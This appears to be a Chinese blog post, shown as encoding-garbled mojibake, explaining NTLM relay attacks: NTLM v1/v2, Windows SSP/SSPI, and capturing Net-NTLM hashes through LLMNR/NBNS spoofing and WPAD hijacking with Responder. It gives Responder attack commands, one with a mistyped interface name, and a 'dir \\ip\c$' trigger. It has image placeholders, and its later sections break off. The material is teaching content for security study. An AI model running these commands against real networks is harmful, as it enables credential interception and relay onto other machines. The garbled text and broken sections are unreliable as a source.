<h4 id="NTLM-v1-amp-NTLM-v2-å¼‚åŒç‚¹"><a href="#NTLM-v1-amp-NTLM-v2-å¼‚åŒç‚¹" class="headerlink" title="NTLM v1&amp; NTLM v2 å¼‚åŒç‚¹"></a>NTLM v1&amp; NTLM v2 å¼‚åŒç‚¹</h4><p>NTLM v1 ä¸ NTLM v2 æœ€æ˜¾è‘—çš„åŒºåˆ«å°±æ˜¯ <code>challenge</code>ä¸åŠ å¯†ç®—æ³•ä¸åŒï¼Œç›¸åŒç‚¹ä¸ºè¿›è¡ŒåŠ å¯†æ—¶éƒ½ç”¨äº†ç”¨æˆ·çš„NTLM Hashã€‚ä¸åŒç‚¹ä¸»è¦ä¸ºï¼š</p>
<ul>
<li>Challengeï¼š</li>
<li>Net-NTLM Hashï¼š NTLM v1ä¸»è¦åŠ å¯†ç®—æ³•ä¸ºDESï¼Œ NTLM v2ä¸»è¦åŠ å¯†ç®—æ³•ä¸º HMAC-MD5</li>
</ul>
<p>Net-NTLM Hash ä¸èƒ½åƒ NTLM Hash ä¸€æ ·è¢«æ”»å‡»è€…ç”¨æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’ï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å„ç§æ–¹æ³•æˆªè·å®¢æˆ·ç«¯ä¸ Server è®¤è¯è¿‡ç¨‹ä¸­çš„ Net-NTLM Hashï¼Œç„¶åå¯¹å…¶è¿›è¡Œæ˜æ–‡çˆ†ç ´ï¼Œæˆ–è€…ç›´æ¥ç”¨æ¥è¿›è¡Œ NTLM ä¸­ç»§æ”»å‡»ã€‚</p>
<hr>
<h3 id="SSP-amp-SSPI"><a href="#SSP-amp-SSPI" class="headerlink" title="SSP&amp; SSPI"></a>SSP&amp; SSPI</h3><h4 id="SSPIï¼ˆSecurity-Support-Provider-Interfaceï¼‰"><a href="#SSPIï¼ˆSecurity-Support-Provider-Interfaceï¼‰" class="headerlink" title="SSPIï¼ˆSecurity Support Provider Interfaceï¼‰"></a>SSPIï¼ˆSecurity Support Provider Interfaceï¼‰</h4><p>SSPIï¼ˆSecurity Support Provider Interfaceï¼‰ å®‰å…¨æ”¯æŒæä¾›è€…æ¥å£ï¼Œ æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­ç”¨äºæ‰§è¡Œå„ç§å®‰å…¨ç›¸å…³æ“ä½œï¼ˆå¦‚èº«ä»½éªŒè¯ï¼‰çš„ä¸€ä¸ªWin32 APIã€‚</p>
<h4 id="SSPï¼ˆSecurity-Support-Providerï¼‰"><a href="#SSPï¼ˆSecurity-Support-Providerï¼‰" class="headerlink" title="SSPï¼ˆSecurity Support Providerï¼‰"></a>SSPï¼ˆSecurity Support Providerï¼‰</h4><p><code>Windows èº«ä»½éªŒè¯åè®®</code><br>Microsoft å®‰å…¨æ”¯æŒæä¾›ç¨‹åºæ¥å£ (SSPI) æ˜¯ Windows èº«ä»½éªŒè¯çš„åŸºç¡€ã€‚ è¦æ±‚èº«ä»½éªŒè¯çš„åº”ç”¨ç¨‹åºå’ŒåŸºç¡€ç»“æ„æœåŠ¡ä¼šä½¿ç”¨ SSPI ï¼Œä½¿ç”¨çš„åè®®å°±æ˜¯ä»¥ä¸‹ <code>SSP</code> å®‰å…¨åè®®ã€‚</p>
<ul>
<li>  NTLM SSP((msv1_0.dll))</li>
<li>  ä¸ºWindows 2000ä¹‹å‰çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åŸŸå’ŒéåŸŸèº«ä»½éªŒè¯ï¼ˆSMB/CIFSï¼‰æä¾›NTLMè´¨è¯¢/å“åº”èº«ä»½éªŒè¯ã€‚</li>
<li>  Kerberos(kerberos.dll)</li>
<li>  Windows 2000åŠæ›´é«˜ç‰ˆæœ¬ä¸­é¦–é€‰çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åŸŸç›¸äº’èº«ä»½éªŒè¯ã€‚</li>
<li>  Cred SSP(credssp.dll)</li>
<li>  ä¸ºè¿œç¨‹æ¡Œé¢è¿æ¥æä¾›å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰å’Œç½‘ç»œçº§èº«ä»½éªŒè¯ã€‚</li>
<li>  Digest SSP</li>
<li>  Negotiate SSP(secur32.dll)</li>
<li>  é€‰æ‹©Kerberosï¼Œå¦‚æœä¸å¯ç”¨åˆ™é€‰æ‹©NTLMåè®®ã€‚åå•†SSPæä¾›å•ç‚¹ç™»å½•èƒ½åŠ›ï¼Œæœ‰æ—¶ç§°ä¸ºé›†æˆWindowsèº«ä»½éªŒè¯</li>
<li>  Schannel SSP(Schannel.dll)</li>
<li>  Windows 2000ä¸­å¼•å…¥ï¼ŒWindows Vistaä¸­æ›´æ–°ä¸ºæ”¯æŒæ›´å¼ºçš„<code>AES</code>åŠ å¯†å’Œ<code>ECC</code>è¯¥æä¾›è€…ä½¿ç”¨SSL/TLSè®°å½•æ¥åŠ å¯†æ•°æ®æœ‰æ•ˆè½½è·ã€‚</li>
<li>  Negotiate Extensions SSP</li>
<li>  PKU2U SSP(pku2u.dll)</li>
<li>  åœ¨ä¸éš¶å±åŸŸçš„ç³»ç»Ÿä¹‹é—´æä¾›ä½¿ç”¨æ•°å­—è¯ä¹¦çš„å¯¹ç­‰èº«ä»½éªŒè¯ã€‚</li>
<li>  æ‘˜è¦SSP(wdigest.dll)</li>
<li>  åœ¨Windowsä¸Kerberosä¸å¯ç”¨çš„éWindowsç³»ç»Ÿé—´æä¾›åŸºäºHTTPå’ŒSASLèº«ä»½éªŒè¯çš„è´¨è¯¢/å“åº”.</li>
</ul>
<h4 id="SSPå’ŒSSPIå¦‚ä½•å·¥ä½œ"><a href="#SSPå’ŒSSPIå¦‚ä½•å·¥ä½œ" class="headerlink" title="SSPå’ŒSSPIå¦‚ä½•å·¥ä½œ"></a>SSPå’ŒSSPIå¦‚ä½•å·¥ä½œ</h4><h3 id="NTLM-SSPåŸç†ï¼ˆNTLMèº«ä»½éªŒè¯åè®®ï¼‰"><a href="#NTLM-SSPåŸç†ï¼ˆNTLMèº«ä»½éªŒè¯åè®®ï¼‰" class="headerlink" title="NTLM SSPåŸç†ï¼ˆNTLMèº«ä»½éªŒè¯åè®®ï¼‰"></a>NTLM SSPåŸç†ï¼ˆNTLMèº«ä»½éªŒè¯åè®®ï¼‰</h3><p><a href="https://tttang.com/archive/1560/#toc_ntlm-ssp-ntlm">https://tttang.com/archive/1560/#toc_ntlm-ssp-ntlm</a></p>
<hr>
<h3 id="NTLM-Relay-ä¸­ç»§æ”»å‡»åŸç†"><a href="#NTLM-Relay-ä¸­ç»§æ”»å‡»åŸç†" class="headerlink" title="NTLM Relay ä¸­ç»§æ”»å‡»åŸç†"></a>NTLM Relay ä¸­ç»§æ”»å‡»åŸç†</h3><p>NTLM Hash åˆ†ä¸º <code>NTLM v1</code> <code>NTLM v2</code> <code>NTLM Session v2</code> ä¸‰ç§ï¼ŒNTLMv2å®‰å…¨æ€§è¦æ¯”NTLMv1 é«˜ä¸€äº›ã€‚<br>å¦‚æœè·å¾—çš„æ˜¯ NTLM v1ï¼Œå°±å¯ä»¥ç›´æ¥è¿›è¡Œçˆ†ç ´ï¼›å¦‚æœé‡åˆ°çš„æ˜¯NTLM v2ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•ä½¿ç”¨NTLM Relayæ”»å‡»ã€‚<br>åœ¨NTLM Relayä¸­ï¼Œæˆ‘ä»¬éœ€è¦æˆªè· Net-NTLM Hashé‡æ”¾è¿›è¡Œæ”»å‡»ï¼ˆ<code>NTLM Relay</code>ï¼‰ï¼Œä»è€Œå®ç°å¯¹å…¶ä»–æœºå™¨çš„æ§åˆ¶æ§åˆ¶ã€‚<br>å¯¹äºå·¥ä½œç»„çš„æœºå™¨æ¥è¯´ï¼Œä¸¤å°æœºå™¨çš„å¯†ç éœ€è¦ä¸€è‡´æ‰èƒ½æˆåŠŸï¼Œå¯¹äºåŸŸç”¨æˆ·æ¥è¯´ï¼Œè¢«æ¬ºéª—ç”¨æˆ·ï¼ˆå‘èµ·è¯·æ±‚çš„ç”¨æˆ·ï¼‰éœ€è¦åŸŸç®¡ç†å‘˜ç»„é‡Œè¾¹çš„ç”¨æˆ·æ‰å¯ä»¥ï¼ŒNTLM ä¸­ç»§æˆåŠŸåçš„æƒé™ä¸ºè¢«æ¬ºéª—ç”¨æˆ·çš„æƒé™ã€‚</p>
<p><img src="/posts/5f88ecbb/e4f7bb4f05390ef9f5b25b3a618fd483.jpg"></p>
<p>ç®€å•æ¥è¯´ï¼Œå®ç°Relayæ”»å‡»éœ€è¦ä¸¤ä¸ªæ­¥éª¤: </p>
<ul>
<li>1.è·å–Net-NTLM Hash</li>
<li>2.é‡æ”¾æ”»å‡»</li>
</ul>
<hr>
<h3 id="è·å–Net-NTLM-Hashçš„æ€è·¯"><a href="#è·å–Net-NTLM-Hashçš„æ€è·¯" class="headerlink" title="è·å–Net-NTLM Hashçš„æ€è·¯"></a>è·å–Net-NTLM Hashçš„æ€è·¯</h3><p>æ€è·¯æ˜¯è®©å—å®³è€…æŠŠNet-NTLM hashå‘é€ç»™æ”»å‡»è€…ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦æ˜¯ä½¿ç”¨SMBã€HTTPã€LDAPã€MSSQLç­‰åè®®æ¥è¿›è¡ŒNTLMè®¤è¯çš„ç¨‹åºï¼Œéƒ½å¯ä»¥å°è¯•ç”¨æ¥å‘æ”»å‡»è€…å‘é€Net-NTLMhashã€‚ä»¥ä¸‹ä¸ºå‡ ç§å¸¸è§çš„è·å–æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<ul>
<li>1.ç½‘ç»œåè®®çš„æ¬ºéª—ä¸åŠ«æŒ</li>
<li>2.é’“é±¼æ”»å‡»</li>
<li>3.ä¸å…¶ä»–æ¼æ´ç»“åˆ</li>
</ul>
<p><img src="/posts/5f88ecbb/a31218ac95efc4806cedd4f74efb4001.png"></p>
<p>å¾®è½¯çš„NTLM SSPï¼ˆNTLM Security Support Providerï¼‰ä¸ºNTLMè®¤è¯çš„å®ç°æä¾›äº†åŸºæœ¬åŠŸèƒ½ï¼Œæ˜¯Windows SSPIï¼ˆSecurity Support Provider Interface ï¼‰çš„ä¸€ç§å…·ä½“å®ç°ã€‚NTLMSSPåªæ˜¯å®ç°äº†NTLMè®¤è¯,å¹¶æ²¡æœ‰è§„å®šä½¿ç”¨ä»€ä¹ˆåè®®æ¥è¿›è¡Œä¼ è¾“ã€‚å®é™…ä¸ŠSMBã€HTTPã€LDAPã€MSSQLç­‰åè®®éƒ½å¯ä»¥æºå¸¦NTLMè®¤è¯çš„ä¸‰ç±»æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™äº›åè®®æ¥è¿›è¡Œæ”»å‡»ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šè¿°è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·å¯†ç çš„hashè¢«ç§°ä¸ºLMhashæˆ–NThashï¼ˆWindows Vista/Windowsserver 2008ä»¥åLMhashè¢«å¼ƒç”¨ï¼‰ï¼Œå³æ‰€è°“çš„NTLMhashã€‚è€Œè¿™ç±»hashå¯ä»¥ç”¨æ¥è¿›è¡Œ<code>pass the hash</code>æ”»å‡»ï¼Œå¹¶ä¸èƒ½ç”¨æ¥<code>relay attack</code>ã€‚è¿™é‡Œä»‹ç»çš„<code>relay attack</code>ä¸¥æ ¼æ„ä¹‰ä¸Šè®²æ˜¯ç”¨äºç½‘ç»œè®¤è¯çš„<code>Net-NTLM hash</code>çš„relayï¼Œ<code>Net-NTLM hash</code>æ˜¯ç”±NTLMè®¤è¯è¿‡ç¨‹ä¸­æœåŠ¡ç«¯è¿”å›çš„<code>challenge</code>å’Œå®¢æˆ·ç«¯çš„<code>response</code>ç»„æˆçš„ã€‚æ‰€ä»¥ä¸¥æ ¼çš„è®²ï¼Œåº”è¯¥æ˜¯Net-NTLM hash relay atackã€‚<br>å¦‚æœä½ è‡ªå·±å†™ä¸€ä¸ªåˆ©ç”¨ NTLM SSP çš„ç¨‹åºï¼Œé‚£ä¹ˆåœ¨æ‹¿åˆ° NTLM æ¶ˆæ¯åï¼Œä½ å¯ä»¥ä»¥ä»»ä½•ä½ å–œæ¬¢çš„æ–¹å¼å°†è¿™äº›æ¶ˆæ¯å‘é€è‡³æœåŠ¡ç«¯ã€‚æ¯”å¦‚é€šè¿‡ HTTPï¼ŒTCPï¼Œæˆ–è€…ä»»ä½•å…¶ä»–ç±»å‹çš„ 7Â å±‚åè®®ï¼Œæˆ–è€…ä½ è‡ªå·±å®šä¹‰çš„åè®®ã€‚</p>
<p>å‰é¢è¯´è¿‡äº† NTLM SSP çš„ TYPE 1/2/3Â ä¸‰æ¡æ¶ˆæ¯ã€‚è¿™ä¸‰æ¡æ¶ˆæ¯æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ç»„å­—èŠ‚ã€‚åœ¨å‰é¢çš„æè¿°ä¸­ï¼Œè¯´åˆ°â€œå®¢æˆ·ç«¯åœ¨ç”Ÿæˆ TYPE 1 æ¶ˆæ¯åï¼Œä¼šå°†æ­¤æ¶ˆæ¯å‘é€åˆ°æœåŠ¡ç«¯â€ã€‚é‚£ä¹ˆå®¢æˆ·ç«¯é€šè¿‡ä»€ä¹ˆæ ·çš„æ–¹å¼å°†æ­¤æ¶ˆæ¯å‘é€ç»™æœåŠ¡ç«¯å‘¢ï¼Ÿ NTLMÂ æœ¬èº«å¹¶æ²¡æœ‰å®šä¹‰åº”è¯¥ç”¨ä»€ä¹ˆæ–¹å¼æ¥å‘é€ï¼Œå®ƒåªè´Ÿè´£ç”Ÿæˆ TYPE 1/2/3Â è¿™ 3 æ¡æ¶ˆæ¯ã€‚  </p>
<p>æ„æ€å°±æ˜¯ï¼šNTLM å¹¶æ²¡æœ‰å®šä¹‰å®ƒæ‰€ä¾èµ–çš„ä¼ è¾“å±‚åè®®ã€‚NTLM æ¶ˆæ¯çš„ä¼ è¾“å®Œå…¨ä¾èµ–äºä½¿ç”¨ NTLM çš„ä¸Šå±‚åè®®æ¥å†³å®šã€‚æ‰€ä»¥è¯´ NTLM æ˜¯ä¸€ä¸ªåµŒå…¥å¼åè®®ã€‚<br>NTLM çš„ä¸Šå±‚åè®®åŸºæœ¬å¯ä»¥æ˜¯ä»»ä½•åè®®ï¼ˆå¦‚æœä¸Šå±‚æ˜¯åŸºäºUDP çš„åè®®çš„è¯ï¼Œå¯èƒ½ä¼šä¸ä¸€æ ·ï¼‰ï¼Œæ‰€ä»¥è¿™å¼•å‡ºäº†è·¨åè®®çš„ NTLM-Relay æŠ€å·§ã€‚æ— è®º NTLM çš„ä¸Šå±‚åè®®æ˜¯ä»€ä¹ˆï¼Œå…¶æºå¸¦çš„ NTLMÂ çš„ä¸‰æ¡æ¶ˆæ¯éƒ½æ˜¯ç”± NTLM SSP ç”Ÿæˆçš„ï¼Œæ‰€ä»¥ä¸Šå±‚åè®®åœ¨ relay çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯å¯ä»¥è¢«æ›¿æ¢æ‰çš„ã€‚æ¯”å¦‚ä» http relayÂ è‡³ smbï¼Œä» smb relayÂ è‡³ ldap/mssqlÂ ç­‰ç­‰ã€‚æˆ‘ä»¬åªéœ€è¦å°†ä¸€ä¸ªåè®®ä¸­çš„ NTLM æ¶ˆæ¯å–å‡ºæ¥ï¼Œç„¶ååŸæ ·ä¸åŠ¨çš„åœ°æ”¾å…¥å¦ä¸€ä¸ªåè®®ï¼Œå°±å®Œæˆäº†ä¸Šå±‚åè®®è½¬æ¢çš„è¿‡ç¨‹ã€‚</p>
<p><strong>SMB-Relay ä¸ NTLM-Relay</strong></p>
<p>SMB-RelayÂ ä¸ NTLM-Relayï¼Œè¿™ä¸¤ç§è¯´æ³•å¤§å®¶éƒ½è§è¿‡ï¼Œé‚£ä¹ˆå“ªç§æ‰æ˜¯æ­£ç¡®çš„ï¼Ÿ</p>
<p>åœ¨ç†è§£äº†å‰é¢æ‰€è¯´çš„ â€œNTLMÂ æ˜¯åµŒå…¥å¼åè®®â€çš„è¯´æ³•åï¼Œå¤§å®¶åº”è¯¥èƒ½å¤Ÿæ˜ç™½ï¼š<br>SMB-RelayÂ æŒ‡çš„æ˜¯ NTLMÂ ä¸Šå±‚åè®®æ˜¯ SMB çš„æƒ…å†µã€‚å¦‚æœä¸Šå±‚åè®®æ˜¯ HTTPï¼Œä¹Ÿè®¸ä½ å¯ä»¥ç®¡å®ƒå«åš HTTP-Relayã€‚æ— è®ºä¸Šå±‚åè®®æ˜¯ä»€ä¹ˆï¼Œéƒ½å¯ä»¥ç»Ÿç§°ä¸º NTLM-Relayã€‚</p>
<h4 id="è·å–Net-NTLM-Hashå·¥å…·ä»‹ç»"><a href="#è·å–Net-NTLM-Hashå·¥å…·ä»‹ç»" class="headerlink" title="è·å–Net-NTLM Hashå·¥å…·ä»‹ç»"></a>è·å–Net-NTLM Hashå·¥å…·ä»‹ç»</h4><blockquote>
<p>Responder(pythonç¼–å†™)<br>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a><br>Inveigh(powershellç¼–å†™)<br>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
</blockquote>
<p>å‚è€ƒ <a href="https://blog.csdn.net/qq_41874930/article/details/108825010#11responderinveigh_41">https://blog.csdn.net/qq_41874930/article/details/108825010#11responderinveigh_41</a></p>
<h5 id="responder"><a href="#responder" class="headerlink" title="responder"></a>responder</h5><p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
<h5 id="Inveigh"><a href="#Inveigh" class="headerlink" title="Inveigh"></a>Inveigh</h5><p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
<h4 id="1-LLMNR-NBNSæ¬ºéª—"><a href="#1-LLMNR-NBNSæ¬ºéª—" class="headerlink" title="1.  LLMNR/NBNSæ¬ºéª—"></a>1.  <strong>LLMNR/NBNSæ¬ºéª—</strong></h4><p>åœ¨Windowsç³»ç»Ÿåç§°è§£æé¡ºåºä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ¬åœ°hostsæ–‡ä»¶ï¼ˆ%windir%\System32\drivers\etc\hostsï¼‰</span><br><span class="line"></span><br><span class="line">DNSç¼“å­˜/DNSæœåŠ¡å™¨</span><br><span class="line"></span><br><span class="line">é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼ˆLLMNRï¼‰å’ŒNetBIOSåç§°æœåŠ¡ï¼ˆNBT-NS)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´å¦‚æœå‰ä¸¤ç§æ–¹æ³•åç§°è§£æå¤±è´¥åï¼ŒWindowsç³»ç»Ÿå°±ä¼šé€šè¿‡ç¬¬ä¸‰ç§æ–¹æ³•è¿›è¡Œåç§°è§£æï¼Œä¹Ÿå°±å¯ä»¥ä½¿ç”¨è¿™ä¸¤ç§åè®®ï¼ˆLLMNRåè®®ã€NBNSåè®®ï¼‰è¿›è¡Œæ¬ºéª—ã€‚å…ˆç®€å•çœ‹ä¸‹ä»€ä¹ˆæ˜¯LLMNR å’Œ NetBiosã€‚</p>
<p><code>LLMNR</code>å…¨ç§°é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼Œæ˜¯åŸºäºåŸŸåç³»ç»Ÿï¼ˆ<code>DNS</code>ï¼‰æ•°æ®åŒ…æ ¼å¼çš„åè®®ï¼Œ<code>IPv4</code>å’Œ<code>IPv6</code>çš„ä¸»æœºå¯ä»¥é€šè¿‡æ­¤åè®®å¯¹åŒä¸€æœ¬åœ°é“¾è·¯ä¸Šçš„ä¸»æœºæ‰§è¡Œåç§°è§£æã€‚ç®€å•ç†è§£ä¸ºå°±æ˜¯ä¸€ç§åœ¨å±€åŸŸç½‘å†…å¯»æ‰¾ä¸»æœºçš„åè®®ã€‚</p>
<p><code>NetBios</code>å…¨ç§°ç½‘ç»œåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼Œå®ƒæä¾›äº†<code>OSI</code>æ¨¡å‹ä¸­çš„ä¼šè¯å±‚æœåŠ¡ï¼Œè®©åœ¨ä¸åŒè®¡ç®—æœºä¸Šè¿è¡Œçš„ä¸åŒç¨‹åºï¼Œå¯ä»¥åœ¨å±€åŸŸç½‘ä¸­ï¼Œäº’ç›¸è¿çº¿ï¼Œä»¥åŠåˆ†äº«æ•°æ®ã€‚<code>NetBIOS</code>ä¹Ÿæ˜¯è®¡ç®—æœºçš„æ ‡è¯†åç§°ï¼Œä¸»è¦ç”¨äºå±€åŸŸç½‘å†…è®¡ç®—æœºçš„äº’è®¿ã€‚<code>NetBIOS</code>çš„å·¥ä½œæµç¨‹å°±æ˜¯æ­£å¸¸çš„æœºå™¨åè§£ææŸ¥è¯¢åº”ç­”è¿‡ç¨‹ã€‚åœ¨<code>Windows</code>æ“ä½œç³»ç»Ÿä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹åœ¨å®‰è£…<code>TCP/IP</code>åè®®åä¼šè‡ªåŠ¨å®‰è£…<code>NetBIOS</code>ã€‚</p>
<p>åœ¨å±€åŸŸç½‘ç¯å¢ƒä¸‹ï¼Œå½“ç”¨æˆ·è¾“å…¥äº†ä¸€ä¸ªä¸å­˜åœ¨ã€æˆ–è€…é”™è¯¯çš„çš„ä¸»æœºåï¼Œæˆ–è€…æ˜¯åœ¨DNSç§ä¸å­˜åœ¨çš„ä¸»æœºåæ—¶ï¼ŒWindowså°±ä¼šé€šè¿‡åˆ©ç”¨LLMNRå’Œ NetBIOSåç§°æœåŠ¡è¿›è¡ŒæŸ¥æ‰¾ï¼Œæœ€ç»ˆåœ¨å±€åŸŸç½‘å†…å¹¿æ’­LLMNR/NBNSæ•°æ®åŒ…æ¥è¯·æ±‚è§£æä¸»æœºåã€‚<br>è€Œæ­¤æ—¶æˆ‘ä»¬åœ¨å±€åŸŸç½‘å†…æœ‰ä¸€å°ä¸»æœºæƒé™ï¼ˆæ”»å‡»æœºï¼‰ï¼Œå°±å¯ä»¥ä¼ªè£…æˆå—å®³ä¸»æœºæƒ³è¦è®¿é—®çš„æœºå™¨ï¼Œä»è€Œè®©å—å®³ä¸»æœºäº¤å‡ºç›¸åº”çš„ç™»é™†å‡­è¯ã€‚æ”»å‡»æœºåœ¨æ­¤è¿‡ç¨‹ä¸­ä¸»è¦æ˜¯å½“ä½œä¸€ä¸ªä¸­é—´äººï¼Œå»æˆªè·å®¢æˆ·ç«¯çš„Net-NTLM Hashã€‚</p>
<h5 id="ä½¿ç”¨Responderåœ¨å±€åŸŸç½‘ä¸‹å¼€å¯ç›‘å¬ï¼Œç­‰å¾…å±€åŸŸç½‘å†…å¹¿æ’­çš„æ•°æ®æŠ¥ã€‚"><a href="#ä½¿ç”¨Responderåœ¨å±€åŸŸç½‘ä¸‹å¼€å¯ç›‘å¬ï¼Œç­‰å¾…å±€åŸŸç½‘å†…å¹¿æ’­çš„æ•°æ®æŠ¥ã€‚" class="headerlink" title="ä½¿ç”¨Responderåœ¨å±€åŸŸç½‘ä¸‹å¼€å¯ç›‘å¬ï¼Œç­‰å¾…å±€åŸŸç½‘å†…å¹¿æ’­çš„æ•°æ®æŠ¥ã€‚"></a>ä½¿ç”¨Responderåœ¨å±€åŸŸç½‘ä¸‹å¼€å¯ç›‘å¬ï¼Œç­‰å¾…å±€åŸŸç½‘å†…å¹¿æ’­çš„æ•°æ®æŠ¥ã€‚</h5><p><code>responder -l eht0 -f -v</code></p>
<p>å‡è£…è¿™é‡Œæ˜¯æµ‹è¯•å›¾![å‡è£…æœ‰å›¾ç‰‡]</p>
<p>ç„¶åå†åŸŸæ§ä¸»æœºä¸Šåˆ©ç”¨SMBåè®®éšä¾¿è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„ä¸»æœº  <code>dir \\ip\c$</code> ä¹‹åç›‘å¬ä¸»æœºå°±ä¼šæ¥æ”¶åˆ°è¿”å›è¿‡æ¥çš„Net-NTLM Hashå€¼ã€‚</p>
<h4 id="2-WPADåŠ«æŒ"><a href="#2-WPADåŠ«æŒ" class="headerlink" title="2.WPADåŠ«æŒ"></a>2.<strong>WPADåŠ«æŒ</strong></h4><p>WPAD(Web Proxy Auto-Discovery Protocol) æ˜¯ç”¨æ¥æŸ¥æ‰¾PACæ–‡ä»¶çš„åè®®ï¼Œå…¶ä¸»è¦é€šè¿‡DHCPã€DNSã€LLMNRã€NBNSåè®®æ¥æŸ¥æ‰¾å­˜æ”¾PACæ–‡ä»¶çš„ä¸»æœºã€‚WPADé€šè¿‡è®©æµè§ˆå™¨<strong>è‡ªåŠ¨å‘ç°ä»£ç†æœåŠ¡å™¨</strong>ï¼ŒæŸ¥æ‰¾å­˜æ”¾PAC æ–‡ä»¶çš„ä¸»æœºæ¥å®šä½ä»£ç†é…ç½®æ–‡ä»¶ï¼Œä¸‹è½½ç¼–è¯‘å¹¶è¿è¡Œï¼Œæœ€ç»ˆè‡ªåŠ¨ä½¿ç”¨ä»£ç†è®¿é—®ç½‘ç»œã€‚</p>
<p>ç”¨æˆ·åœ¨è®¿é—®ç½‘é¡µæ—¶ï¼Œé¦–å…ˆä¼šæŸ¥è¯¢PACæ–‡ä»¶çš„ä½ç½®ï¼Œç„¶åè·å–PACæ–‡ä»¶ï¼Œå°†PACæ–‡ä»¶ä½œä¸ºä»£ç†é…ç½®æ–‡ä»¶ã€‚<br>æŸ¥è¯¢PACæ–‡ä»¶çš„é¡ºåºå¦‚ä¸‹ ï¼š</p>
<ul>
<li>1.é€šè¿‡DHCPæœåŠ¡å™¨</li>
<li>2.æŸ¥è¯¢WPADä¸»æœºçš„IP</li>
<li>Hosts<ul>
<li>DNS(cache/server)</li>
<li>LLMNR</li>
<li>NBNS</li>
</ul>
</li>
</ul>
<p>åŠ«æŒ<code>WPAD</code>ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åˆ©ç”¨<code>LLMNR/NBNS</code>æŠ•æ¯’ï¼Œå¦å¤–ä¸€ç§æ˜¯åˆ©ç”¨<code>ipv6</code>åè®®ï¼Œä½¿ç”¨<code>DHCPv6</code>è¿›è¡ŒåŠ«æŒã€‚</p>
<h5 id="é…åˆLLMNR-NBNSæŠ•æ¯’"><a href="#é…åˆLLMNR-NBNSæŠ•æ¯’" class="headerlink" title="é…åˆLLMNR/NBNSæŠ•æ¯’"></a>é…åˆLLMNR/NBNSæŠ•æ¯’</h5><p>ä¸€ä¸ªå…¸å‹çš„åŠ«æŒæ–¹å¼æ˜¯åˆ©ç”¨LLMNR/NBNSæ¬ºéª—æ¥è®©å—å®³è€…ä»æ”»å‡»è€…è·å–PACæ–‡ä»¶ï¼ŒPACæ–‡ä»¶æŒ‡å®šæ”»å‡»è€…å°±æ˜¯ä»£ç†æœåŠ¡å™¨ï¼Œç„¶åæ”»å‡»è€…å°±å¯ä»¥åŠ«æŒå—å®³è€…çš„HTTPæµé‡ï¼Œåœ¨å…¶ä¸­æ’å…¥ä»»æ„HTMLæ ‡ç­¾ï¼Œä»è€Œè·å¾—ç”¨æˆ·çš„Net-NTLM Hashã€‚</p>
<p>å½“æµè§ˆå™¨è®¾ç½®ä¸º â€œè‡ªåŠ¨æ£€æµ‹ä»£ç†è®¾ç½®â€ åï¼Œå®ƒå°±ä¼šä¸‹è½½æ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„wpad.datæ–‡ä»¶ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå®¢æˆ·ç«¯çš„æµé‡å°±ä¼šç»è¿‡æ”»å‡»è€…çš„æœºå™¨ã€‚<br>![20220426150817.png]</p>
<p>ä½¿ç”¨ <code>Responder</code>åˆ›å»ºä¸€ä¸ªå‡çš„WPADæœåŠ¡å™¨ï¼Œå¹¶å“åº”å®¢æˆ·ç«¯çš„WPADåç§°è§£æã€‚ç„¶åå®¢æˆ·ç«¯è¯·æ±‚è¿™ä¸ªå‡çš„WPADæœåŠ¡å™¨ç§çš„wpad.datæ–‡ä»¶ã€‚<br><code>responder -l eth0 -r on -v -F on -w on</code></p>
<p>![å‡è£…æœ‰å›¾]</p>
<h5 id="é…åˆDHCPv6"><a href="#é…åˆDHCPv6" class="headerlink" title="é…åˆDHCPv6"></a>é…åˆDHCPv6</h5><h3 id="SMBä¸­ç»§æ”»å‡»"><a href="#SMBä¸­ç»§æ”»å‡»" class="headerlink" title="SMBä¸­ç»§æ”»å‡»"></a>SMBä¸­ç»§æ”»å‡»</h3><p> <a href="https://redhatzone.com/ask/article/1459.html">https://redhatzone.com/ask/article/1459.html</a></p>
<h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p><img src="/posts/5f88ecbb/1ccf1452409707b29dcce54f0c62810d.jpg"></p>
